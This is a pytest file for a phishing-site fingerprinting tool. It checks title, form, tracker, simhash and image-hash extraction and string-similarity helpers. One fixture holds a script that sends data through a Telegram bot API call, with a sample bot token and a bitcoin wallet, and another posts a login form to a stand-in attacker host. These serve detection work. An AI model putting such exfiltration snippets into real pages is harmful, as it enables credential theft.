from app.fingerprints.images import favicon_mmh3, hash_similarity, image_fingerprints
from app.fingerprints.similarity import (
    jaccard,
    levenshtein,
    normalize_title,
    simhash_hex,
    simhash_similarity,
    string_similarity,
    title_hash,
)
from app.fingerprints.website import extract_trackers, extract_website_fingerprints
from tests.helpers import PHISH_HTML, png_bytes


def test_website_fingerprints_extracts_core_fields():
    fp = extract_website_fingerprints(PHISH_HTML, "https://login.phish.test/verify")
    assert fp["title"] == "Contoso Bank - Secure Login"
    assert fp["title_hash"] == title_hash("contoso bank secure login")
    assert fp["meta"]["description"].startswith("Sign in")
    assert fp["has_login_form"] is True and fp["password_fields"] == 1
    assert fp["external_form_actions"] == ["collect.evil.test"]
    assert fp["forms"][0]["method"] == "post"
    assert set(fp["tracking_ids"]) == {"G-ABC123XYZ9", "UA-1234567-1", "123456789012345"}
    assert fp["logo_candidates"][0]["src"] == "https://login.phish.test/img/contoso-logo.png"
    assert "www.googletagmanager.com" in fp["scripts"]["hosts"]
    assert len(fp["dom_simhash"]) == 16 and fp["text_simhash"]
    assert fp["word_count"] == 2  # "Verify account" - inputs carry no visible text


def test_tracker_families_and_false_positive_guard():
    html = """
    <script>(function(w,d,s,l,i){})(window,document,'script','dataLayer','GTM-ABCD12');</script>
    <script>_linkedin_partner_id = "1234567";</script>
    <script>ttq.load('C4ABCDEFGHIJKLMNOP12');</script>
    <ins data-ad-client="ca-pub-1234567890123456"></ins>
    <script>ym(12345678, "init", {});</script>
    <script>hjid:1234567</script>
    <script src="https://www.clarity.ms/tag/abcd1234ef"></script>
    <img src="https://www.facebook.com/tr?id=998877665544332&ev=PageView">
    """
    trackers = extract_trackers(html)
    families = {t["family"]: t["id"] for group in trackers.values() for t in group}
    assert families == {
        "gtm": "GTM-ABCD12",
        "linkedin_insight": "1234567",
        "tiktok_pixel": "C4ABCDEFGHIJKLMNOP12",
        "google_adsense": "ca-pub-1234567890123456",
        "yandex_metrika": "12345678",
        "hotjar": "1234567",
        "ms_clarity": "abcd1234ef",
        "meta_pixel": "998877665544332",
    }
    # A G- token without any Google tag context must not be treated as GA4.
    assert extract_trackers("<p>Order G-ABCDEFGH12 shipped</p>") == {}


def test_telegram_and_crypto_indicators():
    html = (
        "<script>fetch('https://api.telegram.org/bot123456789:AAEhBP0av28ns3X2pnGKk6i7wXRzWm8L9xQ/sendMessage')</script>"
        "<p>Send BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>"
    )
    fp = extract_website_fingerprints(html, "https://x.test/")
    assert fp["telegram_exfil"] is True
    assert fp["crypto_wallets"] == ["bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"]


def test_dom_simhash_tracks_template_not_text():
    a = extract_website_fingerprints(PHISH_HTML, "https://a.test/")
    b = extract_website_fingerprints(PHISH_HTML.replace("Contoso", "Fabrikam"), "https://b.test/")
    c = extract_website_fingerprints(
        "<html><body><div><p>totally different</p><ul><li>x</li></ul></div></body></html>", "https://c.test/"
    )
    assert simhash_similarity(a["dom_simhash"], b["dom_simhash"]) == 1.0
    assert simhash_similarity(a["dom_simhash"], c["dom_simhash"]) < 0.9


def test_image_fingerprints_and_similarity():
    red = png_bytes((200, 30, 30))
    red2 = png_bytes((205, 32, 28))
    blue = png_bytes((20, 30, 220), mark=False)
    fa, fb, fc = image_fingerprints(red), image_fingerprints(red2), image_fingerprints(blue)
    assert fa["mmh3"] == favicon_mmh3(red) and fa["mmh3"].lstrip("-").isdigit()
    assert {"phash", "ahash", "dhash", "whash", "md5", "sha256"} <= set(fa)
    assert hash_similarity(fa["phash"], fb["phash"]) >= 0.9
    assert hash_similarity(fa["ahash"], fc["ahash"]) < hash_similarity(fa["ahash"], fb["ahash"])
    assert hash_similarity(None, fa["phash"]) == 0.0
    assert image_fingerprints(b"not an image")["mmh3"]  # hashes still computed for non-images


def test_similarity_helpers():
    assert normalize_title("  Login | ACME — Portal ") == "login acme portal"
    assert title_hash("ab") is None
    assert jaccard(["a", "b"], ["b", "c"]) == 1 / 3
    assert levenshtein("kitten", "sitting") == 3
    assert string_similarity("paypal", "paypa1") > 0.8
    assert simhash_similarity(simhash_hex(["a", "b"]), simhash_hex(["a", "b"])) == 1.0
    assert simhash_similarity("zz", "00") == 0.0
